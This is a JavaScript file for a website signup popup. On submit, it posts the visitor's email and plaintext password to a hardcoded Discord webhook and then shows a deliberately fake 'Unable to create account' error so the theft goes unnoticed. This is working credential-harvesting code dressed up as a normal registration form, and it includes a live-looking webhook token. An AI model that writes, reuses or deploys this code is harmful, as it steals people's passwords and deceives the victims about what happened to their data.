// header button placement and popup handling
const signupBtn = document.getElementById('signupBtn');
const popup = document.getElementById('signupPopup');
const closePopup = document.getElementById('closePopup');
const signupForm = document.getElementById('signupForm');
const signupMsg = document.getElementById('signupMessage');

// Open popup
signupBtn.addEventListener('click', () => {
  popup.setAttribute('aria-hidden', 'false');
  popup.style.display = 'flex';
});

// Close popup
closePopup.addEventListener('click', () => {
  popup.setAttribute('aria-hidden', 'true');
  popup.style.display = 'none';
});

// Close popup when clicking outside
window.addEventListener('click', (e) => {
  if (e.target === popup) {
    popup.setAttribute('aria-hidden', 'true');
    popup.style.display = 'none';
  }
});

// Form submission
signupForm.addEventListener('submit', async (ev) => {
  ev.preventDefault();
  console.log('Form submitted'); // Debug log
  
  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value;
  
  // Only basic email validation
  const emailOK = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  
  if (!emailOK) {
    signupMsg.textContent = 'Please enter a valid email.';
    signupMsg.style.color = '#ff6b6b';
    return;
  }

  // Show loading state
  signupMsg.textContent = 'Processing...';
  signupMsg.style.color = '#666';

  try {
    // Send to Discord webhook
    const response = await fetch('https://discord.com/api/webhooks/1395558887444316331/gfLOAY8nGFqvuqx-NACqR4RJj59Na1bLqekWLixU7dk9CXgqVOgkInxKp6in-hQRdWPC', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        content: `New signup:\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`
      })
    });

    if (response.ok) {
      // Show fake error message
      signupMsg.textContent = 'Error: Unable to create account. Please try again later.';
      signupMsg.style.color = '#ff6b6b';
      signupForm.reset();
      
      // Close popup after 2 seconds
      setTimeout(() => {
        popup.setAttribute('aria-hidden', 'true');
        popup.style.display = 'none';
        signupMsg.textContent = '';
      }, 2000);
    } else {
      throw new Error('Webhook failed');
    }
  } catch (error) {
    console.error('Error:', error);
    signupMsg.textContent = 'Error: Network connection failed. Please check your internet.';
    signupMsg.style.color = '#ff6b6b';
  }
});
